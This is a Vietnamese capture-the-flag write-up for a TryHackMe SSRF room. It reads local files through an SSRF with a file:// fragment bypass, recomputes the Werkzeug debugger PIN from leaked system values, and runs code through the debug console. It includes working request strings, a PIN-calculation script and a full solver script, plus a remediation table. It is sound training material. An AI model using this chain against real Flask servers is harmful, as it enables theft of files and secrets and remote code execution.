# SSRF

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/ssrfqi |
| **Độ khó** | Medium |
| **Chủ đề** | Web, SSRF, RCE, Werkzeug |
| **Ngày** | 16/06/2026 |

---

## Mô tả

Website portfolio của một nhà thực vật học ("Jay Green") chạy Flask/Werkzeug trên cổng 80. Challenge gồm 5 bước nối tiếp:

1. Phát hiện SSRF qua tham số `server` trong endpoint `/download`
2. Dùng `file://` scheme để đọc source code → lấy API key → **Flag 1**
3. Đọc trực tiếp `flag.pdf` của trang admin qua `file://` SSRF → giải mã CID font → **Flag 2**
4. Thu thập thông tin hệ thống qua SSRF → tính PIN Werkzeug debugger
5. Xác thực PIN → RCE qua interactive console → tìm file text → **Flag 3**

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -sC --open -p- --min-rate 5000 10.48.174.125
```

| Cổng | Dịch vụ | Phiên bản |
|------|---------|-----------|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Werkzeug/0.16.0 Python/3.10.7 |

Toàn bộ challenge nằm trên web cổng 80.

### Khám phá web

Truy cập `http://10.48.174.125/`:

- Trang chủ là portfolio thực vật học, có link download tài liệu và link `/admin`
- Truy cập `/admin` → nhận thông báo *"Admin interface only available from localhost!!!"*
- Download link có dạng: `/download?server=secure-file-storage.com:8087&id=75482342`
- Xem page source → JavaScript tiết lộ Werkzeug debugger đang bật với `EVALEX = true` và **`SECRET = "gvbQtUiOI3P10tRxUKW5"`**

Tham số `server` trong `/download` do người dùng kiểm soát hoàn toàn — đây là dấu hiệu SSRF.

---

## Khai thác

### Bước 1 — Xác nhận SSRF và đọc source code

Thử trigger error để xem stack trace:

```
GET /download?server=localhost&id=admin
```

Werkzeug trả về traceback, tiết lộ:
- App nằm tại `/usr/src/app/app.py`
- pycurl được dùng để fetch URL: `server + '/public-docs-k057230990384293/' + filename`

pycurl hỗ trợ `file://` scheme theo mặc định. Vấn đề: path cố định được nối vào sau `server`, nên URL trở thành `file:///path/to/file/public-docs-.../75482342.pdf` — không tồn tại.

**Bypass bằng fragment `#`:** pycurl bỏ qua phần fragment khi fetch `file://`, nên URL `file:///file.py#/public-docs-.../id.pdf` chỉ đọc `file.py`.

```
GET /download?server=file:///usr/src/app/app.py%23&id=75482342
```

Kết quả — toàn bộ source code `app.py`:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"

@app.route("/download")
def download():
    ...
    crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
    ...

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8087, debug=True)
```

**Flag 1: `THM{Hello_Im_just_an_API_key}`**

---

### Bước 2 — Đọc flag.pdf của trang admin

Từ source code, `/admin` trả về file `private-docs/flag.pdf` nếu request đến từ `127.0.0.1`. Không cần SSRF qua HTTP — dùng `file://` đọc thẳng:

```
GET /download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=75482342
```

PDF trả về, nhưng nội dung được encode bằng CID font. Giải mã từ CMap trong PDF stream:

```python
import zlib, re, urllib.request

data = urllib.request.urlopen(url).read()
streams = re.findall(rb'stream\r?\n(.*?)\r?\nendstream', data, re.DOTALL)
cmap = zlib.decompress(streams[4]).decode()
# CMap mapping:
# 01=t, 02=h, 03=m, 04={, 05=c, 06=4, 07=n, 08=_, 09=i, 0A=a,
# 0B=z, 0C=f, 0D=l, 0E=g, 0F=p, 10=?, 11=}
```

Đọc text stream trong stream 0:

```
<01020304> → t,h,m,{
<0506>     → c,4
<07><08><09><08><02><0A> → n,_,i,_,h,a
<0B080C0D0A0E0B080F0D>  → z,_,f,l,a,g,z,_,p,l
<0B1011>               → z,?,}
```

Ghép lại: `thm{c4n_i_haz_flagz_plz?}`

**Flag 2: `THM{c4n_i_haz_flagz_plz?}`**

---

### Bước 3 — Thu thập thông tin hệ thống để tính PIN Werkzeug

Server bật `debug=True` với `EVALEX=true` → có interactive Python console. PIN bảo vệ console nhưng **có thể tính lại** từ thông tin hệ thống nếu biết cách Werkzeug tạo nó.

Dùng SSRF thu thập các giá trị cần thiết:

```bash
# Username (UID = 0 → root)
GET /download?server=file:///proc/self/status%23&id=75482342

# Docker container ID (machine_id — Werkzeug ưu tiên cgroup trước /etc/machine-id)
GET /download?server=file:///proc/self/cgroup%23&id=75482342
# → /docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca

# MAC address của eth0
GET /download?server=file:///sys/class/net/eth0/address%23&id=75482342
# → 02:42:ac:14:00:02
```

---

### Bước 4 — Tính PIN và xác thực

Werkzeug tạo PIN bằng cách hash MD5 các thành phần:

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root',                                                          # username
    'flask.app',                                                     # modname
    'Flask',                                                         # app class
    '/usr/local/lib/python3.10/site-packages/flask/app.py',         # Flask path
]
private_bits = [
    str(int('0242ac140002', 16)),   # MAC → 2485378088962
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca',
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    h.update(bit.encode('utf-8'))
h.update(b'cookiesalt')
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]
pin = '-'.join([num[:3], num[3:6], num[6:]])  # → 110-688-511
```

Xác thực PIN:

```bash
curl "http://10.48.174.125/?__debugger__=yes&cmd=pinauth&pin=110-688-511&s=gvbQtUiOI3P10tRxUKW5"
# → {"auth": true, "exhausted": false}
```

Server trả về cookie xác thực `__wzd85a5ff2ddeee0c7a9138`.

---

### Bước 5 — RCE qua Werkzeug console để đọc file text

Werkzeug debugger console nhận Python code qua GET, gắn với frame ID từ traceback. Sau khi có cookie auth:

```python
import urllib.request, urllib.error, http.cookiejar, re, urllib.parse

SECRET = 'gvbQtUiOI3P10tRxUKW5'
BASE = 'http://10.48.174.125'

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Xác thực PIN để nhận cookie
opener.open(f'{BASE}/?__debugger__=yes&cmd=pinauth&pin=110-688-511&s={SECRET}')

# Trigger error để lấy frame ID
try:
    opener.open(f'{BASE}/download?server=localhost&id=admin')
except urllib.error.HTTPError as e:
    html = e.read().decode()

frm_id = re.findall(r'id="frame-(\d+)"', html)[-1]

# Liệt kê thư mục web
code = '__import__("os").listdir("/usr/src/app")'
params = urllib.parse.urlencode({'__debugger__': 'yes', 'cmd': code, 'frm': frm_id, 's': SECRET})
resp = opener.open(f'{BASE}/download?server=localhost&id=admin&{params}')
# → ['requirements.txt', 'Dockerfile', ..., 'flag-982374827648721338.txt']
```

Biết tên file, đọc bằng SSRF:

```
GET /download?server=file:///usr/src/app/flag-982374827648721338.txt%23&id=75482342
```

**Flag 3: `THM{SSRF2RCE_2_1337_4_M3}`**

---

### Script hoàn chỉnh

```python
#!/usr/bin/env python3
"""
SSRF — TryHackMe challenge solver
"""
import hashlib, urllib.request, urllib.error, urllib.parse, http.cookiejar
import zlib, re
from itertools import chain

TARGET = 'http://10.48.174.125'
SECRET = 'gvbQtUiOI3P10tRxUKW5'

def ssrf_read(path):
    """Đọc file local qua file:// SSRF với fragment bypass."""
    url = f'{TARGET}/download?server=file://{path}%23&id=75482342'
    return urllib.request.urlopen(url, timeout=10).read()

# ─── Flag 1: đọc source code ─────────────────────────────────────────────────

src = ssrf_read('/usr/src/app/app.py').decode()
api_key = re.search(r'X-API-KEY: (THM\{[^}]+\})', src).group(1)
print(f'[+] Flag 1 (API Key): {api_key}')

# ─── Flag 2: giải mã PDF của admin ───────────────────────────────────────────

pdf = ssrf_read('/usr/src/app/private-docs/flag.pdf')
streams = re.findall(rb'stream\r?\n(.*?)\r?\nendstream', pdf, re.DOTALL)
cmap_raw = zlib.decompress(streams[4]).decode()
cmap = {int(k, 16): chr(int(v, 16)) for k, v in re.findall(r'<([0-9a-f]+)> <([0-9a-f]+)>', cmap_raw)}
text_stream = zlib.decompress(streams[0])
hex_blocks = re.findall(rb'<([0-9a-fA-F]+)>', text_stream)
flag2 = ''.join(cmap.get(b, '?') for block in hex_blocks
                for b in [int(block[i:i+2], 16) for i in range(0, len(block), 2)])
print(f'[+] Flag 2 (Admin PDF): {flag2}')

# ─── Flag 3: RCE qua Werkzeug PIN ────────────────────────────────────────────

# Thu thập thông tin
cgroup = ssrf_read('/proc/self/cgroup').decode()
docker_id = cgroup.strip().partition('/docker/')[2].split('\n')[0]
mac = ssrf_read('/sys/class/net/eth0/address').decode().strip()
mac_int = str(int(mac.replace(':', ''), 16))

# Tính PIN
bits = ['root', 'flask.app', 'Flask',
        '/usr/local/lib/python3.10/site-packages/flask/app.py',
        mac_int, docker_id]
h = hashlib.md5()
for b in bits:
    h.update(b.encode())
h.update(b'cookiesalt')
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]
pin = '-'.join([num[:3], num[3:6], num[6:]])
print(f'[*] PIN: {pin}')

# Xác thực PIN
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.open(f'{TARGET}/?__debugger__=yes&cmd=pinauth&pin={pin}&s={SECRET}')

# Trigger error lấy frame ID
try:
    opener.open(f'{TARGET}/download?server=localhost&id=admin')
except urllib.error.HTTPError as e:
    html = e.read().decode()
frm_id = re.findall(r'id="frame-(\d+)"', html)[-1]

# Liệt kê thư mục web
code = '__import__("os").listdir("/usr/src/app")'
params = urllib.parse.urlencode({'__debugger__': 'yes', 'cmd': code, 'frm': frm_id, 's': SECRET})
resp = opener.open(f'{TARGET}/download?server=localhost&id=admin&{params}')
output = resp.read().decode()
flag_file = re.search(r'flag-[0-9]+\.txt', output).group(0)

flag3 = ssrf_read(f'/usr/src/app/{flag_file}').decode().strip()
print(f'[+] Flag 3 (Text file): {flag3}')
```

---

## Cờ

> Giá trị thực không được ghi vào write-up.

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| Flag 1 | Hardcoded trong `app.py` — header `X-API-KEY` | Đọc source qua `file://` SSRF |
| Flag 2 | `private-docs/flag.pdf` — trang admin | Đọc PDF qua `file://` SSRF, giải mã CID font |
| Flag 3 | `flag-982374827648721338.txt` trong thư mục web | Tính PIN Werkzeug → RCE → đọc file |

---

## Bài học

| Lỗ hổng | Gốc rễ | Cách fix |
|---------|--------|----------|
| SSRF qua `server` parameter | pycurl fetch URL do user cung cấp không qua whitelist | Dùng whitelist domain; chặn `file://`, `gopher://`, IP nội bộ |
| `file://` scheme qua pycurl | libcurl hỗ trợ nhiều scheme mặc định | Giới hạn scheme bằng `CURLOPT_PROTOCOLS = CURLPROTO_HTTP | CURLPROTO_HTTPS` |
| Werkzeug debug mode trong production | `debug=True` lộ interactive console có thể tính PIN | Không bao giờ bật `debug=True` trên production |
| PIN Werkzeug tính được lại | Thuật toán dùng thông tin hệ thống đọc được — MAC, container ID | Không có cách fix ngoài tắt debug mode |
| API key hardcode trong source | Secret nằm trong code → lộ khi SSRF đọc source | Dùng environment variable; không hardcode credential |
| Admin check bằng `remote_addr` | `file://` bypass hoàn toàn check IP vì không đi qua HTTP | Không dùng file:// để phục vụ tài liệu nhạy cảm; xác thực bằng auth token |
